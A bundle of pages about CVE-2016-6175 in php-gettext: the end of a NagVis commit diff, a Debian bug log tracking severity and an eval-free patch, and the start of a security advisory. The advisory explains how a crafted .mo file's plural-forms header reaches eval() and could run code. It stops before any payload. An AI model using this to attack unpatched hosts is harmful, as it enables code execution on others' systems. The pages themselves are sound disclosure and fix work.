|  |  | // $result = $this->cache\_translations[$key]; |
|  |  | // $list = explode(chr(0), $result); |
|  |  | // return $list[$select]; |
|  |  | // } |
|  |  | // } else { |
|  |  | // $num = $this->find\_string($key); |
|  |  | // if ($num == -1) { |
|  |  | // return ($number != 1) ? $plural : $single; |
|  |  | // } else { |
|  |  | // $result = $this->get\_translation\_string($num); |
|  |  | // $list = explode(chr(0), $result); |
|  |  | // return $list[$select]; |
|  |  | // } |
|  |  | // } |
|  |  | //} |
|  |  |  |
|  |  | function pgettext($context, $msgid) { |
|  |  | $key = $context . chr(4) . $msgid; |
| Expand All | | @@ -421,16 +422,16 @@ function pgettext($context, $msgid) { |
|  |  | } |
|  |  | } |
|  |  |  |
|  |  | function npgettext($context, $singular, $plural, $number) { |
|  |  | $key = $context . chr(4) . $singular; |
|  |  | $ret = $this->ngettext($key, $plural, $number); |
|  |  | if (strpos($ret, "\004") !== FALSE) { |
|  |  | return $singular; |
|  |  | } else { |
|  |  | return $ret; |
|  |  | } |
|  |  | //function npgettext($context, $singular, $plural, $number) { |
|  |  | // $key = $context . chr(4) . $singular; |
|  |  | // $ret = $this->ngettext($key, $plural, $number); |
|  |  | // if (strpos($ret, "\004") !== FALSE) { |
|  |  | // return $singular; |
|  |  | // } else { |
|  |  | // return $ret; |
|  |  | // } |
|  |  |  |
|  |  | } |
|  |  | //} |
|  |  | } |
|  |  |  |
|  |  | ?> |

Toggle all file notes
Toggle all file annotations

### 0 comments on commit `4fe8672`

Please
[sign in](/login?return_to=https%3A%2F%2Fgithub.com%2FNagVis%2Fnagvis%2Fcommit%2F4fe8672a5aec3467da72b5852ca6d283c15adb53) to comment.

## Footer

© 2025 GitHub, Inc.

### Footer navigation

* [Terms](https://docs.github.com/site-policy/github-terms/github-terms-of-service)
* [Privacy](https://docs.github.com/site-policy/privacy-policies/github-privacy-statement)
* [Security](https://github.com/security)
* [Status](https://www.githubstatus.com/)
* [Docs](https://docs.github.com/)
* [Contact](https://support.github.com?tags=dotcom-footer)
* Manage cookies
* Do not share my personal information

You can’t perform that action at this time.



=== Content from bugs.debian.org_3f21e799_20250126_100211.html ===

# Debian Bug report logs - #851771 php-gettext: CVE-2016-6175

[![version graph](version.cgi?collapse=1;found=php-gettext%2F1.0.11-1;width=2;package=src%3Aphp-gettext;fixed=php-gettext%2F1.0.12-1;height=2;absolute=0)](version.cgi?collapse=1;found=php-gettext%2F1.0.11-1;package=src%3Aphp-gettext;info=1;fixed=php-gettext%2F1.0.12-1;absolute=0)

Package:
[src:php-gettext](pkgreport.cgi?src=php-gettext);
Maintainer for [src:php-gettext](pkgreport.cgi?src=php-gettext) is [Debian PHP PEAR Maintainers <pkg-php-pear@lists.alioth.debian.org>](pkgreport.cgi?maint=pkg-php-pear%40lists.alioth.debian.org);

Reported by: [Salvatore Bonaccorso <carnil@debian.org>](pkgreport.cgi?submitter=carnil%40debian.org)

Date: Wed, 18 Jan 2017 16:24:12 UTC

Severity: *grave*

Tags: buster-ignore, jessie-ignore, patch, security, stretch-ignore, upstream, wheezy-ignore

Found in version php-gettext/1.0.11-1

Fixed in version php-gettext/1.0.12-1

**Done:** James Valleroy <jvalleroy@mailbox.org>

Bug is archived. No further changes may be made.

Forwarded to [https://bugs.launchpad.net/php-gettext/+bug/1606184](https://bugs.launchpad.net/php-gettext/%2Bbug/1606184)

Display info messages

View this report as an [mbox folder](bugreport.cgi?bug=851771;mbox=yes), [status mbox](bugreport.cgi?bug=851771;mbox=yes;mboxstatus=yes), [maintainer mbox](bugreport.cgi?bug=851771;mbox=yes;mboxmaint=yes)

---

**Report forwarded**
to `debian-bugs-dist@lists.debian.org, carnil@debian.org, team@security.debian.org, secure-testing-team@lists.alioth.debian.org, Debian PHP PEAR Maintainers <pkg-php-pear@lists.alioth.debian.org>`:

`Bug#851771`; Package `src:php-gettext`.
(Wed, 18 Jan 2017 16:24:14 GMT) ([full text](bugreport.cgi?bug=851771;msg=2), [mbox](bugreport.cgi?bug=851771;mbox=yes;msg=2), [link](#1)).

---

**Acknowledgement sent**
to `Salvatore Bonaccorso <carnil@debian.org>`:

New Bug report received and forwarded. Copy sent to `carnil@debian.org, team@security.debian.org, secure-testing-team@lists.alioth.debian.org, Debian PHP PEAR Maintainers <pkg-php-pear@lists.alioth.debian.org>`.
(Wed, 18 Jan 2017 16:24:14 GMT) ([full text](bugreport.cgi?bug=851771;msg=4), [mbox](bugreport.cgi?bug=851771;mbox=yes;msg=4), [link](#3)).

---

[Message #5](#5) received at submit@bugs.debian.org ([full text](bugreport.cgi?bug=851771;msg=5), [mbox](bugreport.cgi?bug=851771;mbox=yes;msg=5), reply):

![](/cgi-bin/libravatar.cgi?email=carnil%40debian.org)
From: Salvatore Bonaccorso <carnil@debian.org>
To: Debian Bug Tracking System <submit@bugs.debian.org>
Subject: php-gettext: CVE-2016-6175
Date: Wed, 18 Jan 2017 17:23:43 +0100
```
Source: php-gettext
Version: 1.0.11-1
Severity: grave
Tags: security upstream
Forwarded: [https://bugs.launchpad.net/php-gettext/+bug/1606184](https://bugs.launchpad.net/php-gettext/%2Bbug/1606184)

Hi,

the following vulnerability was published for php-gettext.

[CVE-2016-6175](https://security-tracker.debian.org/tracker/CVE-2016-6175)[0]:
Use of eval too unrestrictive

If you fix the vulnerability please also make sure to include the
CVE (Common Vulnerabilities & Exposures) id in your changelog entry.

For further information see:

[0] <https://security-tracker.debian.org/tracker/CVE-2016-6175>
    <https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2016-6175>
[1] [https://bugs.launchpad.net/php-gettext/+bug/1606184](https://bugs.launchpad.net/php-gettext/%2Bbug/1606184)

Regards,
Salvatore

```

---

**Information forwarded**
to `debian-bugs-dist@lists.debian.org, Debian PHP PEAR Maintainers <pkg-php-pear@lists.alioth.debian.org>`:

`Bug#851771`; Package `src:php-gettext`.
(Sun, 22 Jan 2017 21:51:06 GMT) ([full text](bugreport.cgi?bug=851771;msg=7), [mbox](bugreport.cgi?bug=851771;mbox=yes;msg=7), [link](#6)).

---

**Acknowledgement sent**
to `Ola Lundqvist <ola@inguza.com>`:

Extra info received and forwarded to list. Copy sent to `Debian PHP PEAR Maintainers <pkg-php-pear@lists.alioth.debian.org>`.
(Sun, 22 Jan 2017 21:51:06 GMT) ([full text](bugreport.cgi?bug=851771;msg=9), [mbox](bugreport.cgi?bug=851771;mbox=yes;msg=9), [link](#8)).

---

[Message #10](#10) received at 851771@bugs.debian.org ([full text](bugreport.cgi?bug=851771;msg=10), [mbox](bugreport.cgi?bug=851771;mbox=yes;msg=10), reply):

![](/cgi-bin/libravatar.cgi?email=ola%40inguza.com)
From: Ola Lundqvist <ola@inguza.com>
To: Salvatore Bonaccorso <carnil@debian.org>
Cc: Debian LTS <debian-lts@lists.debian.org>, 851771@bugs.debian.org
Subject: CVE-2016-6175 and 851771
Date: Sun, 22 Jan 2017 22:47:32 +0100
```
Hi Salvatore

I started checking the CVEs for php-gettext and I'm not sure I follow
the information for [CVE-2016-6175](https://security-tracker.debian.org/tracker/CVE-2016-6175).
Maybe you have more data than I do.

The vulnerability is that a malicous user that have permission to
craft .mo files in the target filesystem could execute any php code on
that system.
I find that a quite unlikely attack vector. Based on this I also think
the bug should have a different priority than grave.

Or have I missed anything crucial?

I'm asking as I plan to mark this one as no-dsa for wheezy.

Best regards

// Ola

PS. There is another bug on the same package and that one should
probably have a grave bug filed, but that is another story.
DS.

--
 --- Inguza Technology AB --- MSc in Information Technology ----
/  ola@inguza.com                    Folkebogatan 26            \
|  opal@debian.org                   654 68 KARLSTAD            |
|  <http://inguza.com/>                Mobile: +46 (0)70-332 1551 |
\  gpg/f.p.: 7090 A92B 18FE 7994 0C36 4FE4 18A1 B1CF 0FE5 3DD9  /
 ---------------------------------------------------------------

```

---

**Added tag(s) stretch-ignore.**
Request was from `Niels Thykier <niels@thykier.net>`
to `control@bugs.debian.org`.
(Sat, 04 Feb 2017 10:30:14 GMT) ([full text](bugreport.cgi?bug=851771;msg=12), [mbox](bugreport.cgi?bug=851771;mbox=yes;msg=12), [link](#11)).

---

**Added tag(s) jessie-ignore.**
Request was from `Andreas Beckmann <anbe@debian.org>`
to `control@bugs.debian.org`.
(Wed, 19 Apr 2017 09:57:04 GMT) ([full text](bugreport.cgi?bug=851771;msg=14), [mbox](bugreport.cgi?bug=851771;mbox=yes;msg=14), [link](#13)).

---

**Added tag(s) wheezy-ignore.**
Request was from `Andreas Beckmann <anbe@debian.org>`
to `control@bugs.debian.org`.
(Sat, 22 Apr 2017 21:18:03 GMT) ([full text](bugreport.cgi?bug=851771;msg=16), [mbox](bugreport.cgi?bug=851771;mbox=yes;msg=16), [link](#15)).

---

**Information forwarded**
to `debian-bugs-dist@lists.debian.org, Debian PHP PEAR Maintainers <pkg-php-pear@lists.alioth.debian.org>`:

`Bug#851771`; Package `src:php-gettext`.
(Thu, 13 Sep 2018 20:48:03 GMT) ([full text](bugreport.cgi?bug=851771;msg=18), [mbox](bugreport.cgi?bug=851771;mbox=yes;msg=18), [link](#17)).

---

**Acknowledgement sent**
to `Ivo De Decker <ivodd@debian.org>`:

Extra info received and forwarded to list. Copy sent to `Debian PHP PEAR Maintainers <pkg-php-pear@lists.alioth.debian.org>`.
(Thu, 13 Sep 2018 20:48:03 GMT) ([full text](bugreport.cgi?bug=851771;msg=20), [mbox](bugreport.cgi?bug=851771;mbox=yes;msg=20), [link](#19)).

---

[Message #21](#21) received at 851771@bugs.debian.org ([full text](bugreport.cgi?bug=851771;msg=21), [mbox](bugreport.cgi?bug=851771;mbox=yes;msg=21), reply):

![](/cgi-bin/libravatar.cgi?email=ivodd%40debian.org)
From: Ivo De Decker <ivodd@debian.org>
To: 851771@bugs.debian.org
Subject: Re: php-gettext: CVE-2016-6175
Date: Thu, 13 Sep 2018 22:46:17 +0200
```
Hi,

On Wed, Jan 18, 2017 at 05:23:43PM +0100, Salvatore Bonaccorso wrote:
> the following vulnerability was published for php-gettext.
>
> [CVE-2016-6175](https://security-tracker.debian.org/tracker/CVE-2016-6175)[0]:
> Use of eval too unrestrictive

The packages using php-gettext in buster are:

cacti: cacti
kopano-webapp: kopano-webapp-common
phpmyadmin: phpmyadmin
tt-rss: tt-rss

Only phpmyadmin is a key package.

For phpmyadmin, php-gettext was replaced by motranslator
(<https://github.com/phpmyadmin/motranslator/>) in 4.7. Buster currently has
4.6, but a newer version might be uploaded at some point (see
<https://bugs.debian.org/879741>).

Cheers,

Ivo

```

---

**Information forwarded**
to `debian-bugs-dist@lists.debian.org, Debian PHP PEAR Maintainers <pkg-php-pear@lists.alioth.debian.org>`:

`Bug#851771`; Package `src:php-gettext`.
(Tue, 12 Mar 2019 21:21:03 GMT) ([full text](bugreport.cgi?bug=851771;msg=23), [mbox](bugreport.cgi?bug=851771;mbox=yes;msg=23), [link](#22)).

---

**Acknowledgement sent**
to `Ivo De Decker <ivodd@debian.org>`:

Extra info received and forwarded to list. Copy sent to `Debian PHP PEAR Maintainers <pkg-php-pear@lists.alioth.debian.org>`.
(Tue, 12 Mar 2019 21:21:03 GMT) ([full text](bugreport.cgi?bug=851771;msg=25), [mbox](bugreport.cgi?bug=851771;mbox=yes;msg=25), [link](#24)).

---

[Message #26](#26) received at 851771@bugs.debian.org ([full text](bugreport.cgi?bug=851771;msg=26), [mbox](bugreport.cgi?bug=851771;mbox=yes;msg=26), reply):

![](/cgi-bin/libravatar.cgi?email=ivodd%40debian.org)
From: Ivo De Decker <ivodd@debian.org>
To: Ola Lundqvist <ola@inguza.com>
Cc: Salvatore Bonaccorso <carnil@debian.org>, 851771@bugs.debian.org
Subject: Re: CVE-2016-6175 and 851771
Date: Tue, 12 Mar 2019 22:20:02 +0100
```
control: tags -1 buster-ignore

Hi,

On Sun, Jan 22, 2017 at 10:47:32PM +0100, Ola Lundqvist wrote:
> I started checking the CVEs for php-gettext and I'm not sure I follow
> the information for [CVE-2016-6175](https://security-tracker.debian.org/tracker/CVE-2016-6175).
> Maybe you have more data than I do.
>
> The vulnerability is that a malicous user that have permission to
> craft .mo files in the target filesystem could execute any php code on
> that system.
> I find that a quite unlikely attack vector. Based on this I also think
> the bug should have a different priority than grave.
>
> Or have I missed anything crucial?

After a brief discussion on irc, and input from the security team, I'm marking
this buster-ignore, on the understanding that php-gettext won't be in bullseye.

"< jmm_> I'm fine with buster-ignoring it, but it should go away after buster"

Thanks,

Ivo

```

---

**Added tag(s) buster-ignore.**
Request was from `Ivo De Decker <ivodd@debian.org>`
to `851771-submit@bugs.debian.org`.
(Tue, 12 Mar 2019 21:21:03 GMT) ([full text](bugreport.cgi?bug=851771;msg=28), [mbox](bugreport.cgi?bug=851771;mbox=yes;msg=28), [link](#27)).

---

**Information forwarded**
to `debian-bugs-dist@lists.debian.org, Debian PHP PEAR Maintainers <pkg-php-pear@lists.alioth.debian.org>`:

`Bug#851771`; Package `src:php-gettext`.
(Fri, 24 Apr 2020 20:57:07 GMT) ([full text](bugreport.cgi?bug=851771;msg=30), [mbox](bugreport.cgi?bug=851771;mbox=yes;msg=30), [link](#29)).

---

**Acknowledgement sent**
to `William Desportes <williamdes@wdes.fr>`:

Extra info received and forwarded to list. Copy sent to `Debian PHP PEAR Maintainers <pkg-php-pear@lists.alioth.debian.org>`.
(Fri, 24 Apr 2020 20:57:07 GMT) ([full text](bugreport.cgi?bug=851771;msg=32), [mbox](bugreport.cgi?bug=851771;mbox=yes;msg=32), [link](#31)).

---

[Message #33](#33) received at 851771@bugs.debian.org ([full text](bugreport.cgi?bug=851771;msg=33), [mbox](bugreport.cgi?bug=851771;mbox=yes;msg=33), reply):

![](/cgi-bin/libravatar.cgi?email=williamdes%40wdes.fr)
From: William Desportes <williamdes@wdes.fr>
To: 851771@bugs.debian.org
Subject: 24/04/2020 - #851771 update
Date: Fri, 24 Apr 2020 22:39:05 +0200
```
[[Message part 1](bugreport.cgi?att=0;bug=851771;msg=33) (text/plain, inline)]
```
```
Hi,

> Only phpmyadmin is a key package.

phpMyAdmin no longer depends on php-gettext.

phpMyAdmin is absent from buster but present in buster-backports and
does not depend on php-gettext.

(+ buster-backports in sources.list)

# apt-rdepends -r php-php-gettext
Reading package lists... Done
Building dependency tree
Reading state information... Done
php-php-gettext
  Reverse Depends: cacti (1.2.2+ds1-2+deb10u2)
  Reverse Depends: nagvis (1:1.9.11-1)
  Reverse Depends: php-gettext (1.0.12-0.1)
  Reverse Depends: tt-rss (>= 18.12+dfsg-1.1)
cacti
  Reverse Depends: cacti-spine (>= 1.2.2-1)
cacti-spine
nagvis
  Reverse Depends: nagvis-demos (= 1:1.9.11-1)
nagvis-demos
php-gettext
  Reverse Depends: kopano-webapp-common (3.5.2+dfsg1-1)

I hope my update is useful.

Regards,

William

```
```
[[signature.asc](bugreport.cgi?att=1;bug=851771;filename=signature.asc;msg=33) (application/pgp-signature, attachment)]
```

---

**Added tag(s) patch.**
Request was from `Sunil Mohan Adapa <sunil@medhas.org>`
to `control@bugs.debian.org`.
(Thu, 18 Jun 2020 00:33:02 GMT) ([full text](bugreport.cgi?bug=851771;msg=35), [mbox](bugreport.cgi?bug=851771;mbox=yes;msg=35), [link](#34)).

---

**Information forwarded**
to `debian-bugs-dist@lists.debian.org, Debian PHP PEAR Maintainers <pkg-php-pear@lists.alioth.debian.org>`:

`Bug#851771`; Package `src:php-gettext`.
(Thu, 18 Jun 2020 00:39:02 GMT) ([full text](bugreport.cgi?bug=851771;msg=37), [mbox](bugreport.cgi?bug=851771;mbox=yes;msg=37), [link](#36)).

---

**Acknowledgement sent**
to `Sunil Mohan Adapa <sunil@medhas.org>`:

Extra info received and forwarded to list. Copy sent to `Debian PHP PEAR Maintainers <pkg-php-pear@lists.alioth.debian.org>`.
(Thu, 18 Jun 2020 00:39:02 GMT) ([full text](bugreport.cgi?bug=851771;msg=39), [mbox](bugreport.cgi?bug=851771;mbox=yes;msg=39), [link](#38)).

---

[Message #40](#40) received at 851771@bugs.debian.org ([full text](bugreport.cgi?bug=851771;msg=40), [mbox](bugreport.cgi?bug=851771;mbox=yes;msg=40), reply):

![](/cgi-bin/libravatar.cgi?email=sunil%40medhas.org)
From: Sunil Mohan Adapa <sunil@medhas.org>
To: 851771@bugs.debian.org, control@bugs.debian.org
Cc: Salvatore Bonaccorso <carnil@debian.org>, Ola Lundqvist <ola@inguza.com>,
Ivo De Decker <ivodd@debian.org>
Subject: Re: php-gettext: CVE-2016-6175
Date: Wed, 17 Jun 2020 17:29:57 -0700
```
[[Message part 1](bugreport.cgi?att=0;bug=851771;msg=40) (text/plain, inline)]
```
```
tag 851771 + patch
thanks

Hello,

TT-RSS is an important application for FreedomBox and it continues to
use php-gettext library. TT-RSS is currently not available for testing.
It would be nice to have it back.

To address this, I have implemented a parser for the plurals expressions
instead of using the eval() method as discussed in the upstream bug as
solution. This patch is under the same license as php-gettext (GPLv2 or
higher).

- A simple operator-precedence parser that prioritizes simplicity and
readability. Avoid using eval() for evaluating plural expressions.
  - Fixes [CVE-2016-6175](https://security-tracker.debian.org/tracker/CVE-2016-6175).
  - Fixes upstream bug [https://bugs.launchpad.net/php-gettext/+bug/1606184](https://bugs.launchpad.net/php-gettext/%2Bbug/1606184)
  - Fixes Debian bug <https://bugs.debian.org/851771>

- Grammar for parsing code is same as the grammar for GNU gettext
library:
<http://git.savannah.gnu.org/cgit/gettext.git/tree/gettext-runtime/intl/plural.y>

- Extensive tests for various locales with help from Unicode's plurals
rules. Tests for invalid syntax and expression parsing.

This patch has been submitted upstream at
[https://bugs.launchpad.net/php-gettext/+bug/1606184](https://bugs.launchpad.net/php-gettext/%2Bbug/1606184) . Please consider
applying the patch in Debian if the upstream doesn't do so shortly.

Thanks,

--
Sunil

```
```
[[2-0001-Iterate-user-table-in-a-sorted-way-fix-tests-with-la.patch](bugreport.cgi?att=1;bug=851771;filename=2-0001-Iterate-user-table-in-a-sorted-way-fix-tests-with-la.patch;msg=40) (text/x-patch, attachment)]
```
```
[[1-0001-Iterate-user-table-in-a-sorted-way-fix-tests-with-la.patch](bugreport.cgi?att=2;bug=851771;filename=1-0001-Iterate-user-table-in-a-sorted-way-fix-tests-with-la.patch;msg=40) (text/x-patch, attachment)]
```
```
[[signature.asc](bugreport.cgi?att=3;bug=851771;filename=signature.asc;msg=40) (application/pgp-signature, attachment)]
```

---

**Information forwarded**
to `debian-bugs-dist@lists.debian.org, Debian PHP PEAR Maintainers <pkg-php-pear@lists.alioth.debian.org>`:

`Bug#851771`; Package `src:php-gettext`.
(Wed, 15 Jul 2020 22:45:03 GMT) ([full text](bugreport.cgi?bug=851771;msg=42), [mbox](bugreport.cgi?bug=851771;mbox=yes;msg=42), [link](#41)).

---

**Acknowledgement sent**
to `Sunil Mohan Adapa <sunil@medhas.org>`:

Extra info received and forwarded to list. Copy sent to `Debian PHP PEAR Maintainers <pkg-php-pear@lists.alioth.debian.org>`.
(Wed, 15 Jul 2020 22:45:03 GMT) ([full text](bugreport.cgi?bug=851771;msg=44), [mbox](bugreport.cgi?bug=851771;mbox=yes;msg=44), [link](#43)).

---

[Message #45](#45) received at 851771@bugs.debian.org ([full text](bugreport.cgi?bug=851771;msg=45), [mbox](bugreport.cgi?bug=851771;mbox=yes;msg=45), reply):

![](/cgi-bin/libravatar.cgi?email=sunil%40medhas.org)
From: Sunil Mohan Adapa <sunil@medhas.org>
To: 851771@bugs.debian.org, Salvatore Bonaccorso <carnil@debian.org>,
Ola Lundqvist <ola@inguza.com>, Ivo De Decker <ivodd@debian.org>
Subject: Re: php-gettext: CVE-2016-6175
Date: Wed, 15 Jul 2020 15:41:26 -0700
```
[[Message part 1](bugreport.cgi?att=0;bug=851771;msg=45) (text/plain, inline)]
```
```
I seem to have attached the wrong set of patches to this bug earlier.
Here are the correct ones. Upstream bug already has the correct set of
patches.

--
Sunil

```
```
[[0001-Use-custom-parser-for-parsing-plural-expressions-ins.patch](bugreport.cgi?att=1;bug=851771;filename=0001-Use-custom-parser-for-parsing-plural-expressions-ins.patch;msg=45) (text/x-patch, attachment)]
```
```
[[0002-Adopt-tests-to-run-recent-version-of-phpunit.patch](bugreport.cgi?att=2;bug=851771;filename=0002-Adopt-tests-to-run-recent-version-of-phpunit.patch;msg=45) (text/x-patch, attachment)]
```
```
[[signature.asc](bugreport.cgi?att=3;bug=851771;filename=signature.asc;msg=45) (application/pgp-signature, attachment)]
```

---

**Added tag(s) pending.**
Request was from `James Valleroy <jvalleroy@mailbox.org>`
to `control@bugs.debian.org`.
(Thu, 19 Nov 2020 23:51:05 GMT) ([full text](bugreport.cgi?bug=851771;msg=47), [mbox](bugreport.cgi?bug=851771;mbox=yes;msg=47), [link](#46)).

---

**Reply sent**
to `James Valleroy <jvalleroy@mailbox.org>`:

You have taken responsibility.
(Fri, 20 Nov 2020 04:24:02 GMT) ([full text](bugreport.cgi?bug=851771;msg=49), [mbox](bugreport.cgi?bug=851771;mbox=yes;msg=49), [link](#48)).

---

**Notification sent**
to `Salvatore Bonaccorso <carnil@debian.org>`:

Bug acknowledged by developer.
(Fri, 20 Nov 2020 04:24:02 GMT) ([full text](bugreport.cgi?bug=851771;msg=51), [mbox](bugreport.cgi?bug=851771;mbox=yes;msg=51), [link](#50)).

---

[Message #52](#52) received at 851771-close@bugs.debian.org ([full text](bugreport.cgi?bug=851771;msg=52), [mbox](bugreport.cgi?bug=851771;mbox=yes;msg=52), reply):

![](/cgi-bin/libravatar.cgi?email=ftpmaster%40ftp-master.debian.org)
From: Debian FTP Masters <ftpmaster@ftp-master.debian.org>
To: 851771-close@bugs.debian.org
Subject: Bug#851771: fixed in php-gettext 1.0.12-1
Date: Fri, 20 Nov 2020 04:20:04 +0000
```
Source: php-gettext
Source-Version: 1.0.12-1
Done: James Valleroy <jvalleroy@mailbox.org>

We believe that the bug you reported is fixed in the latest version of
php-gettext, which is due to be installed in the Debian FTP archive.

A summary of the changes between this version and the previous one is
attached.

Thank you for reporting the bug, which will now be closed.  If you
have further comments please address them to 851771@bugs.debian.org,
and the maintainer will reopen the bug report if appropriate.

Debian distribution maintenance software
pp.
James Valleroy <jvalleroy@mailbox.org> (supplier of updated php-gettext package)

(This message was generated automatically at their request; if you
believe that there is a problem with it please contact the archive
administrators by mailing ftpmaster@ftp-master.debian.org)

-----BEGIN PGP SIGNED MESSAGE-----
Hash: SHA512

Format: 1.8
Date: Thu, 19 Nov 2020 19:41:37 -0500
Source: php-gettext
Architecture: source
Version: 1.0.12-1
Distribution: unstable
Urgency: low
Maintainer: Debian PHP PEAR Maintainers <pkg-php-pear@lists.alioth.debian.org>
Changed-By: James Valleroy <jvalleroy@mailbox.org>
Closes: [851771](bugreport.cgi?bug=851771)
Changes:
 php-gettext (1.0.12-1) unstable; urgency=low
 .
   * Team upload.
 .
   [ Marcelo Jorge Vieira ]
   * d/control: Set Vcs-* to salsa.debian.org
 .
   [ James Valleroy ]
   * Drop patch to ignore test results
   * Apply patch to use custom parser for plural expressions (Closes: #[851771](bugreport.cgi?bug=851771))
     - Thanks to Sunil Mohan Adapa <sunil@medhas.org> for the patch
   * Apply patch to update test cases for recent phpunit
     - Thanks to Sunil Mohan Adapa <sunil@medhas.org> for the patch
   * Trim trailing whitespace.
   * Use secure copyright file specification URI.
   * Update watch file format version to 4.
   * Bump debhelper from deprecated 9 to 12.
   * Set debhelper-compat version in Build-Depends.
   * Change priority extra to priority optional.
   * Set upstream metadata fields: Repository, Repository-Browse.
   * Remove Priority on php-gettext that duplicates source.
Checksums-Sha1:
 221c2ddc7922de9c2b89d2fc74421377c287e7e5 2064 php-gettext_1.0.12-1.dsc
 8f591a53c157d2ae0f9fc36bc0107b8927b57905 14392 php-gettext_1.0.12-1.debian.tar.xz
 7620e3d56e97eed3ea91aafc6f82c1dcf52a8053 7820 php-gettext_1.0.12-1_amd64.buildinfo
Checksums-Sha256:
 06114a4cfe289d3e5d67ca1371232ea21924b7bc6c97246f4d402d46b77aa939 2064 php-gettext_1.0.12-1.dsc
 e1d308e7aea943ed7e21ca0cd214aecb3d160efa6bf1af215dec6cd5f7e9c9ee 14392 php-gettext_1.0.12-1.debian.tar.xz
 054e7129f471c513c79585a119c997aed5f43faeac35dc04342cf459d311cb7b 7820 php-gettext_1.0.12-1_amd64.buildinfo
Files:
 1bab61f080c72557b8f7f2f63b27e630 2064 php optional php-gettext_1.0.12-1.dsc
 7a2c7d83f730c9670a97acb39bc9d598 14392 php optional php-gettext_1.0.12-1.debian.tar.xz
 349a8e0926d6b5e907bd34cdfe17cdc1 7820 php optional php-gettext_1.0.12-1_amd64.buildinfo

-----BEGIN PGP SIGNATURE-----

iQJKBAEBCgA0FiEEfWrbdQ+RCFWJSEvmd8DHXntlCAgFAl+3PWEWHGp2YWxsZXJv
eUBtYWlsYm94Lm9yZwAKCRB3wMdee2UICDtjEADRC64zlAcAVm1HAQZiv+V5sF7f
5hhGEAmNyQdgPcKdsFKkEPGMpX96ZR6E/M76oZunkCP0SVA+mWpFEAt/9yFO6PYC
RSgu3zY7vpIjqOv4dZXCuUJPf+HjslnghBBXbWWA3pfoOV5GbHaH2ejBnmwRds0j
MWfl1KBhFN0yXlcGPa8uxCjxAWpAv1vCt789k6fvT5VRF+ajPJLVH5IVOiVC0MEB
jfEBtHo15VgJDayc+5g6Glw3p45VqqgyPxtf1jIe4T4xyi/cLZTx6XV9J+m46qnX
Jfnr+ltXieVpIWWol8YdeOoJ7KCV6iITWZlQr603KP0HCVzAovXgjweeKnf0GWh/
P/8RKE5z0WX8DtOjvlbBBG7hmT2LJJsI+OA2zJV102hhOM9E70UFgAwsYHjixqU9
HPxe0KO4sjicgAqlyyKUcqX2gj4ATB2id2zUwFpEfq4pQmC9B5Et1J73klAfE6jv
E+3Um0HN3GfcKKGuLxFZwNoLWH1f4DwLp653LNlhMMZsIRRlckP1hZdq7hU8WAa0
ZqFoXpIzB/a7olDukC9rG9NSRtKOc6Z86ihqbQu/oTdr67MRw8EXt0mCJGMK3o+9
zKxX+fHur+6vXLCq53HA6szBgu20WVlxn5m0ICH+LyNpOJvVOqSsqF7hnOjL5EJ0
xM1If/sIlFlVnP9ggw==
=NQYM
-----END PGP SIGNATURE-----

```

---

**Bug archived.**
Request was from `Debbugs Internal Request <owner@bugs.debian.org>`
to `internal_control@bugs.debian.org`.
(Sun, 12 Sep 2021 07:42:45 GMT) ([full text](bugreport.cgi?bug=851771;msg=54), [mbox](bugreport.cgi?bug=851771;mbox=yes;msg=54), [link](#53)).

---

Send a report that [this bug log contains spam](https://bugs.debian.org/cgi-bin/bugspam.cgi?bug=851771).

---

Debian bug tracking system administrator <owner@bugs.debian.org>.
Last modified:
Sun Jan 26 10:02:11 2025;
Machine Name:
buxtehude

[Debian Bug tracking system](https://www.debian.org/Bugs/)

Debbugs is free software and licensed under the terms of the GNU General
Public License version 2. The current version can be obtained
from <https://bugs.debian.org/debbugs-source/>.

Copyright © 1999 Darren O. Benham,
1997,2003 nCipher Corporation Ltd,
1994-97 Ian Jackson,
2005-2017 Don Armstrong, and many other contributors.



=== Content from kmkz-web-blog.blogspot.com_d8d98b21_20250126_100204.html ===


# [kmkz's blog](https://kmkz-web-blog.blogspot.com/)

Just another web blog

## 2016/07/25

### [[Advisory] CVE-2016-6175](https://kmkz-web-blog.blogspot.com/2016/07/advisory-cve-2016-6175.html)

# **Title**:
**g****ettext.****php****<= 1.0.12** **unauthenticated** **code
execution with** **POTENTIAL****privileges escalation**

# **Date**: June
25th, 2016
# **Author**:
kmkz (Bourbon Jean-marie) |
@kmkz\_security

# **Project****Homepage**: https://launchpad.net/php-gettext/
# **Download**:
https://launchpad.net/php-gettext/trunk/1.0.12/+download/php-gettext-1.0.12.tar.gz
# **Version**:
1.0.12 (latest release)
# **Tested on**:
Linux Debian, PHP 5.6.19-2+b1

# **CVSS**: **7.1**

# **CVE ID**:
**CVE-2016-6175**
# **OVE ID**:
**OVE-20160705-0004**
# **OSVD****B****ID**: n/a

# Thanks:
**Lars Michelsen** from
NagVis project where this bug was discovered and **Danilo Segan**
from gettext.php team project for
their reactivity and professionalism

# **Credits**:

<https://github.com/NagVis/nagvis/commit/4fe8672a5aec3467da72b5852ca6d283c15adb53>
[https://bugs.launchpad.net/php-gettext/+bug/1606184](https://bugs.launchpad.net/php-gettext/%2Bbug/1606184)

# **Fix****es**:
[https://github.com/NagVis/nagvis/blob/4fe8672a5aec3467da72b5852ca6d283c15adb53/share/ser](https://github.com/NagVis/nagvis/blob/4fe8672a5aec3467da72b5852ca6d283c15adb53/share/serv)ver/core/ext/php-gettext-1.0.12/gettext.php

[https://bugs.launchpad.net/php-gettext/+bug/1606184](https://bugs.launchpad.net/php-gettext/%2Bbug/1606184)

**g****ettext.php
<= 1.0.12 (latest)**  **local/remote code execution** **with****POTENTIAL****privileges escalation** **issue**

I. APPLICATION

This library
provides PHP functions to read MO files even when gettext is not
compiled in or when appropriate locale is not present on the system.

This issue was
discovered by auditing Nagvis project source code, however NagVis is
not impacted by the following issue.

NagVis is a visualization addon for the well known network
managment system [Nagios](http://www.nagios.org/).

NagVis can be used to visualize Nagios Data, e.g. to display IT
processes like a mail system or a network infrastructure.

II. ADVISORY

A possible remote
(or local) code execution were identified in the **gettext.php**
file allowing an attacker to gain access on the targeted host system
and/or gain application’s privileges throught a
specially crafted .mo language file.

The **$string** variable is not sufficiently
sanitized before
to be submitted to **eval()**
function (which is dangerous) in **select\_string()**
function causing the security issue.

III. VULNERABILITY DESCRIPTION

The
**gettext\_reader****()**funtion try to test magic number that
need to match with .mo files :

**$MAGIC1 =
"\x95\x04\x12\xde";**
**$MAGIC2 =
"\xde\x12\x04\x95**";
If it seems correct
then we’ll continue.

We then extract
forms from .mo file’s header through **get\_plural\_forms()**
function and check them with a deprecated
